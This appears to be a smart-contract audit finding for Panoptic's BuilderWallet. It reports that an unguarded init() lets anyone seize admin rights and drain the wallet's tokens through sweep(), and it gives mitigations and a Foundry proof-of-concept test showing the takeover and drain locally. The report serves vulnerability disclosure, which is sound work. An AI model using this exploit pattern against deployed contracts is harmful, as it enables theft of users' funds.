# Title
Unprotected init() in BuilderWallet allows Takeover by attacker and drain Funds

## Summary
BuilderWallet has an insecure initialization design because the `init(address _builderAdmin)` function is external and lacks both access control and a one time initialization guard. 
After deployment, the wallet does not enforce that `init()` can only be called by the `BuilderFactory` or that it can only be executed once. 
As a result, any external attacker can call `init()` at any time and set themselves as builderAdmin. Once the attacker becomes builderAdmin, they can invoke `sweep()` to transfer all ERC20 tokens held by the wallet to their own address. Although the factory is intended to deploy and initialize the wallet, this intent is not enforced at the contract level, leading to a full BuilderWallet takeover and complete fund loss risk.

## Impact
- An attacker can set themselves as `builderAdmin` and gain full control over the wallet allowing unrestricted access to privileged functions.
- The attacker can use `sweep()` to drain all ERC20 tokens from the `BuilderWallet`, leading to direct and irreversible loss of funds.

## Mitigation
- Restrict `init()` so it can only be called by the `BuilderFactory` and only once i.e 
`require(msg.sender == FACTORY)`
`require(builderAdmin == address(0)))`
- Alternatively move `builderAdmin` initialization into the constructor to eliminate the need for a separate `init()` function.

## Reference
[Link](https://github.com/code-423n4/2025-12-panoptic/blob/a4361d6d8dc6420c09187d80ea1a7ce851d1ca36/contracts/RiskEngine.sol#L2315-L2317)

## Poc

```solidity
// //SPDX-Licenese-Identifier: BUSL-1.1
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import {BuilderWallet} from "../../contracts/RiskEngine.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Simple Mock Token
contract MockToken is ERC20 {
    constructor() ERC20("Mock", "MCK") {
        _mint(msg.sender, 1000e18);
    }
}

contract BuilderWalletAuditTest is Test {
    BuilderWallet public wallet;
    MockToken public token;
    
    address factory = makeAddr("Factory");
    address aliceAdmin = makeAddr("Alice");
    address attacker = makeAddr("Attacker");

    function setUp() public {
        // Deploy the BuilderWallet and MockToken
        wallet = new BuilderWallet(factory);
        token = new MockToken();
        
        vm.prank(factory);
        wallet.init(aliceAdmin);
        
        // Fund the wallet with some tokens
        token.transfer(address(wallet), 1000e18);
    }

    function test_Exploit_WalletTakeoverAndDrain() public {

        // Even Alice is already admin, Attacker calls init()
        vm.prank(attacker);
        wallet.init(attacker);

        assertEq(wallet.builderAdmin(), attacker, "Attacker should have hijacked admin");

        uint256 walletBalBefore = token.balanceOf(address(wallet));
        
        vm.prank(attacker);
        wallet.sweep(address(token), attacker);

        assertEq(token.balanceOf(attacker), walletBalBefore, "Attacker should have stolen all tokens");
        assertEq(token.balanceOf(address(wallet)), 0, "Wallet should be empty");
    }
}
```